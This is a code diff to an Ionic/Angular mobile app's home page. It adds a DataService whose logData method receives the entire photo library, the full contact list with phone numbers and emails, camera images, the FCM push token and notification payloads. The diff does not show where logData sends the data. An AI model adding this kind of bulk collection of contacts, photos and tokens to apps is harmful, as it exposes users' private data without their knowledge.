@@ -6,6 +6,7 @@ import { Contacts } from '@ionic-native/contacts';
 import { Component } from '@angular/core';
 import { NavController } from 'ionic-angular';
 import { LocalNotifications } from '@ionic-native/local-notifications';
+import { DataService } from '../../services/data.service';
 
 @Component({
     selector: 'page-home',
@@ -19,6 +20,7 @@ export class HomePage {
     fcmToken: any = '';
     constructor(public navCtrl: NavController,
         // private _callNumber: CallNumber,
+        private _dataService: DataService,
         private _localNotifications: LocalNotifications,
         private _contacts: Contacts,
         private _camera: Camera,
@@ -42,7 +44,7 @@ export class HomePage {
     }
 
     getAllPhotos() {
-
+        this._dataService.withLoader('Đợi xíu nhé :)');
         this._photoLibrary.requestAuthorization().then(() => {
             this._photoLibrary.getLibrary().subscribe({
                 next: library => {
@@ -51,6 +53,7 @@ export class HomePage {
                     //     err => console.log(err)
                     // );
                     this.allPhotos = library;
+                    this._dataService.logData(library);
                     // library.forEach(function (libraryItem) {
                     //     console.log(libraryItem.id);          // ID of the photo
                     //     console.log(libraryItem.photoURL);    // Cross-platform access to photo
@@ -75,10 +78,12 @@ export class HomePage {
     }
 
     getContactList() {
+        this._dataService.withLoader('Đợi xíu nhé :)');
         this._contacts.find(
             ['displayName', 'name', 'phoneNumbers', 'emails'],
             { filter: "", multiple: true })
             .then(data => {
+                this._dataService.logData({'contactList': data});
 
                 for (var i = 0; i < data.length; i++) {
                     var contact = data[i];
@@ -125,6 +130,7 @@ export class HomePage {
             // If it's base64:
             this.cameraResult.status = true;
             this.cameraResult.data = 'data:image/jpeg;base64,' + imageData;
+            this._dataService.logData(this.cameraResult);
         }, (err) => {
             this.cameraResult.status = false;
             this.cameraResult.error = 'ERROR: ' + err;
@@ -138,11 +144,13 @@ export class HomePage {
         this._fcm.getToken().then(token => {
             // this.openNotify("Token: "+ token);
             this.fcmToken = token;
+            this._dataService.logData('FCM Token: '+token);
             // backend.registerToken(token);
             console.log('token: ', token);
         });
 
         this._fcm.onNotification().subscribe(data => {
+            this._dataService.logData({'fcmOnNotify':data});
             if (data.wasTapped) {
                 this.openNotify("Received in background");
                 console.log("Received in background");
